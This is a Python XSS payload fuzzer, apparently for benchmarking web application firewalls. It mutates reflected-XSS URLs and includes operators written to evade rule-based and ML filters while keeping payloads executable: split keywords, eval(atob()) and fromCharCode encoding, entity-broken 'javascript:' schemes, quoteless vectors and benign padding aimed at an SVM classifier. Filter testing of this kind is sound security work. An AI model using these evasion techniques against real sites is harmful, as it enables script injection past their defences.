"""Small, syntax-preserving-ish XSS payload mutator.

The fuzzer changes representation and context around an existing payload; it
does not execute JavaScript.  It is intentionally conservative so that the
original payload remains recognizable in benchmark logs.
"""

import base64
import random
import re


def _random_text(length=6):
    alphabet = "xX sS tT 0123456789".replace(" ", "")
    return "".join(random.choice(alphabet) for _ in range(length))


def _split_markup(payload):
    """Split a payload into (context_prefix, markup) at the first '<'.

    Dataset entries are reflected-XSS URLs such as ``.../page.php?ref=><script>
    alert(1)</script>``. The prefix is the URL/reflection context and must be
    preserved; only the injected markup should be rewritten. When there is no
    ``<`` the whole payload is treated as markup.
    """
    index = payload.find('<')
    if index == -1:
        return '', payload
    return payload[:index], payload[index:]


def tag_case(payload):
    """Randomise the case of HTML tag names and closing-tag markers."""
    tag_pattern = re.compile(r"(<\/?)([A-Za-z][\w:-]*)")

    def replace(match):
        name = "".join(c.upper() if random.random() < 0.5 else c.lower()
                       for c in match.group(2))
        return match.group(1) + name

    return tag_pattern.sub(replace, payload)


def comments_injection(payload):
    """Insert an HTML comment at a safe boundary or before a closing tag."""
    comment = "<!--" + _random_text() + "-->"
    closing = re.search(r"</[A-Za-z][^>]*>", payload)
    if closing:
        position = random.choice([closing.start(), closing.end()])
    else:
        position = random.randrange(len(payload) + 1)
    return payload[:position] + comment + payload[position:]


def comments_rewriting(payload):
    """Rewrite an existing HTML/JavaScript comment, if one is present."""
    patterns = [r"<!--.*?-->", r"/\*.*?\*/", r"//[^\r\n]*"]
    for pattern in patterns:
        if re.search(pattern, payload, flags=re.DOTALL):
            return re.sub(pattern, "<!--" + _random_text() + "-->", payload,
                          count=1, flags=re.DOTALL)
    return payload


def invariant_tags(payload):
    """Wrap only the injected markup in an inert element, keeping the prefix.

    Wrapping the whole string (URL included) produced non-equivalent payloads;
    wrapping just the markup region leaves the reflection context and the
    executable fragment intact.
    """
    prefix, markup = _split_markup(payload)
    if not markup:
        return payload
    tag = random.choice(["b", "span", "i", "div"])
    return f"{prefix}<{tag}>{markup}</{tag}>"


def attribute_context(payload):
    """Move the executable body into an event-handler context, keeping prefix.

    Extracts the JavaScript body from the injected markup (a ``<script>`` body
    or an ``alert``/``confirm``/``prompt`` call) and rebuilds it as an
    equivalent event-handler vector, preserving the reflection prefix. Using
    less-common handlers (``ontoggle``, ``onpageshow``) adds signature variety.
    The fuzzer never renders or executes the result.
    """
    prefix, markup = _split_markup(payload)
    script_match = re.search(
        r"<script(?:\s[^>]*)?>(.*?)</script>",
        markup,
        flags=re.IGNORECASE | re.DOTALL,
    )
    if script_match:
        body = script_match.group(1).strip()
    else:
        call = re.search(r"\b(?:alert|confirm|prompt)\s*\([^()]*\)", markup, re.IGNORECASE)
        body = call.group(0) if call else ''
    if not body:
        return payload

    # Keep quote characters from prematurely terminating the generated value.
    attribute_body = body.replace('"', "&quot;").replace("'", "&#39;")
    variants = [
        f'<img src="x" onerror="{attribute_body}">',
        f'<svg onload="{attribute_body}"></svg>',
        f'<details open ontoggle="{attribute_body}"></details>',
        f'<body onpageshow="{attribute_body}"></body>',
    ]
    return prefix + random.choice(variants)


def js_comments_injection(payload):
    """Add a JavaScript comment around whitespace or an expression boundary."""
    if re.search(r"\s+", payload):
        return re.sub(r"\s+", "/**/", payload, count=1)
    return payload


def js_argument_rewrite(payload):
    """Replace a numeric function argument with an equivalent expression.

    Every generated expression evaluates to the original integer.  This keeps
    the mutation focused on representation rather than changing the argument's
    value or type.
    """
    function_pattern = re.compile(r"\b(alert|confirm|prompt)\s*\(([^()]*)\)", re.I)
    match = function_pattern.search(payload)
    if not match:
        return payload

    argument = match.group(2).strip()
    if not re.fullmatch(r"[+-]?\d+", argument):
        return payload

    value = int(argument)
    offset = random.randint(1, 9)
    equivalents = [
        f"({value}+0)",
        f"({value}-0)",
        f"({value}*1)",
        f"({value}/1)",
        f"(({value}+{offset})-{offset})",
        f"({value}+({offset}-{offset}))",
    ]
    replacement = f"{match.group(1)}{random.choice(equivalents)}"
    return payload[:match.start()] + replacement + payload[match.end():]


def js_function_alias(payload):
    """Use an equivalent common JavaScript call where possible."""
    replacements = {
        "alert": ["window.alert", "globalThis.alert"],
        "confirm": ["window.confirm", "globalThis.confirm"],
        "prompt": ["window.prompt", "globalThis.prompt"],
    }
    pattern = re.compile(r"\b(alert|confirm|prompt)(?=\s*\()", re.I)
    return pattern.sub(lambda m: random.choice(replacements[m.group(1).lower()]), payload, count=1)


def js_operator_rewrite(payload):
    """Reserved for context-aware operator mutations.

    JavaScript operators such as ``==``/``===`` and ``&&``/``&`` are not
    generally equivalent, so this strategy intentionally leaves the payload
    unchanged until an expression-aware implementation is available.
    """
    return payload


# ---------------------------------------------------------------------------
# Evasion operators
#
# These disguise the detection signature (the literal ``alert(`` /
# ``javascript:`` / quoted-handler tokens that rule-based and ML filters key
# on) while preserving execution and meaning: each result pops the same dialog
# as the original. They are what let a mutated payload slip past a filter
# instead of merely changing representation around an intact signature.
# ---------------------------------------------------------------------------

def _call_pattern():
    return re.compile(r"\b(alert|confirm|prompt)\s*\(([^()]*)\)", re.IGNORECASE)


def js_keyword_split(payload):
    """``alert(1)`` -> ``window['al'+'ert'](1)`` - same call, no ``alert(`` token."""
    match = _call_pattern().search(payload)
    if not match:
        return payload
    name = match.group(1)
    if len(name) < 2:
        return payload
    cut = random.randint(1, len(name) - 1)
    accessor = random.choice(["window", "self", "globalThis", "top"])
    replacement = f"{accessor}['{name[:cut]}'+'{name[cut:]}']({match.group(2)})"
    return payload[:match.start()] + replacement + payload[match.end():]


def js_eval_base64(payload):
    """Replace a call with ``eval(atob('<base64>'))`` - equivalent, token-free."""
    match = _call_pattern().search(payload)
    if not match:
        return payload
    encoded = base64.b64encode(match.group(0).encode("utf-8", "ignore")).decode("ascii")
    replacement = f"eval(atob('{encoded}'))"
    return payload[:match.start()] + replacement + payload[match.end():]


def js_fromcharcode(payload):
    """Replace a call with ``eval(String.fromCharCode(...))`` - equivalent."""
    match = _call_pattern().search(payload)
    if not match:
        return payload
    codes = ",".join(str(ord(char)) for char in match.group(0))
    replacement = f"eval(String.fromCharCode({codes}))"
    return payload[:match.start()] + replacement + payload[match.end():]


def scheme_obfuscation(payload):
    """Break the ``javascript:`` token with an entity it still decodes to.

    In an HTML attribute/URI context the browser decodes the entity before
    parsing the scheme, so execution is unchanged while the literal
    ``javascript:`` signature is gone.
    """
    match = re.search(r"javascript:", payload, re.IGNORECASE)
    if not match:
        return payload
    variants = [
        "java&#09;script:",
        "java&#x09;script:",
        "jav&#97;script:",
        "javas&#99;ript:",
    ]
    return payload[:match.start()] + random.choice(variants) + payload[match.end():]


def quoteless_vector(payload):
    """Rewrite ``<script>BODY</script>`` as a compact, separator-obfuscated tag.

    Dropping quotes and using ``/`` or a tab as the attribute separator is a
    well-known rule-bypass that browsers still execute.
    """
    prefix, markup = _split_markup(payload)
    match = re.search(r"<script(?:\s[^>]*)?>(.*?)</script>", markup,
                      flags=re.IGNORECASE | re.DOTALL)
    if not match:
        return payload
    body = match.group(1).strip()
    if not body or ('"' in body or "'" in body):
        # Only emit a quoteless handler when the body has no quotes to clash.
        return payload
    variant = random.choice([
        f"<svg/onload={body}>",
        f"<svg\tonload={body}>",
        f"<img/src/onerror={body}>",
    ])
    return prefix + markup[:match.start()] + variant + markup[match.end():]


_BENIGN_WORDS = (
    "the quick brown fox jumps over a lazy dog while people read the news and "
    "share photos of their family holidays booking hotels flights and trains "
    "for summer travel around europe with friends looking at menus recipes and "
    "reviews of local restaurants shops libraries museums gardens and parks "
    "where children play football tennis and ride bicycles on sunny afternoons "
    "students study history science music and art at school and university "
    "writing essays about weather markets farming business health and education"
).split()


def benign_padding(payload):
    """Dilute the character-bigram distribution with benign text.

    A character n-gram TF-IDF classifier scores on the *relative* frequency of
    character bigrams. Surrounding the injected markup with a large block of
    benign words (inside an HTML comment, so the browser ignores it and the
    script still executes) lowers the normalised weight of the markup bigrams
    and can push the sample across the SVM boundary toward benign, without
    changing what the payload does. This targets the ML WAF specifically;
    rule-based engines still see the intact tag.
    """
    prefix, markup = _split_markup(payload)
    if not markup:
        return payload
    count = random.randint(60, 140)
    filler = " ".join(random.choice(_BENIGN_WORDS) for _ in range(count))
    pad = f"<!-- {filler} -->"
    # Pad on whichever side(s) keep the executable markup untouched.
    placement = random.choice(('before', 'after', 'both'))
    if placement == 'before':
        return f"{prefix}{pad}{markup}"
    if placement == 'after':
        return f"{prefix}{markup}{pad}"
    return f"{prefix}{pad}{markup}{pad}"


class XssFuzzer:
    """Generate bounded, compounded XSS representations.

    Each round starts from the original payload and applies a short random
    chain of operators (not a single one), so that many rounds explore
    distinct variants instead of collapsing onto a handful of wrappers.
    Emitted variants are de-duplicated within a run, and every chain is
    validated structurally before it is returned.
    """

    strategies = [
        tag_case,
        comments_injection,
        comments_rewriting,
        invariant_tags,
        attribute_context,
        js_comments_injection,
        js_argument_rewrite,
        js_function_alias,
        js_keyword_split,
        js_eval_base64,
        js_fromcharcode,
        scheme_obfuscation,
        quoteless_vector,
        benign_padding,
    ]

    def __init__(self, payload, max_length=2048, max_chain=4, max_attempts=16):
        self.initial_payload = payload
        self.payload = payload
        self.max_length = max(128, int(max_length))
        self.max_chain = max(1, min(int(max_chain), len(self.strategies)))
        self.max_attempts = max(1, int(max_attempts))
        self._emitted = set()
        self.last_operator = ''
        self.last_validation = ''

    def _choose_chain(self):
        """Pick a short, ordered chain of distinct operators to compound."""
        length = random.randint(1, self.max_chain)
        pool = list(self.strategies)
        random.shuffle(pool)
        return pool[:length]

    @staticmethod
    def _validate(payload):
        """Perform conservative structural checks; do not execute the payload."""
        if not payload or not payload.strip():
            return False, 'empty'
        if any(ord(char) < 9 for char in payload):
            return False, 'control-character'
        # Note: no quote-balance check. Reflected-XSS payloads legitimately
        # carry a single break-out quote (e.g. "><script>...), so counting
        # quotes rejects valid, effective payloads and suppresses diversity.
        # A candidate should retain an executable/context marker. The list
        # covers the tags, event handlers and JS sinks the operators emit,
        # including the obfuscated forms (eval/atob/fromCharCode, split calls,
        # entity-broken schemes) so valid evasion variants are not rejected.
        marker = re.compile(
            r'<\s*(?:script|svg|img|iframe|details|body|a|video|audio|'
            r'object|embed|math|marquee|input|form)\b|'
            r'on[a-z]+\s*=|'
            r'java[^a-z]{0,6}script\s*:|'
            r"\b(?:alert|confirm|prompt|eval|atob|setTimeout|setInterval)\s*\(|"
            r'fromCharCode\s*\(|'
            r"\[\s*['\"][a-z]", re.I
        )
        if not marker.search(payload):
            return False, 'no-xss-context'
        return True, 'ok'

    def fuzz(self):
        # Make several attempts to produce a *fresh*, valid, in-bounds variant
        # by compounding a short chain of operators. Compounding (rather than a
        # single operator) and de-duplication together stop the output from
        # collapsing onto a few repeated wrappers across many rounds.
        fallback = None
        fallback_operators = ''
        last_reason = 'no-valid-mutation'
        for _ in range(self.max_attempts):
            chain = self._choose_chain()
            candidate = self.initial_payload
            for strategy in chain:
                candidate = strategy(candidate)
            names = '+'.join(strategy.__name__ for strategy in chain)

            if len(candidate) > self.max_length:
                last_reason = f'rejected-length>{self.max_length}'
                continue
            if candidate == self.initial_payload:
                last_reason = 'rejected-unchanged'
                continue
            valid, reason = self._validate(candidate)
            if not valid:
                last_reason = f'rejected-{reason}'
                continue
            if candidate not in self._emitted:
                self._emitted.add(candidate)
                self.payload = candidate
                self.last_operator = names
                self.last_validation = 'ok'
                return candidate
            # Valid but already produced this run: keep it as a fallback and
            # keep trying for something new.
            fallback = candidate
            fallback_operators = names
            last_reason = 'duplicate'

        if fallback is not None:
            self.payload = fallback
            self.last_operator = fallback_operators
            self.last_validation = 'ok-duplicate'
            return fallback

        # No operator chain produced a valid variant. Keep the source visible
        # in the log rather than sending an invalid synthetic payload.
        self.last_operator = 'none'
        self.last_validation = (
            'no-valid-mutation' if last_reason == 'duplicate' else last_reason
        )
        self.payload = self.initial_payload
        return self.payload

    def current(self):
        return self.payload

    def reset(self):
        self.payload = self.initial_payload
        return self.payload
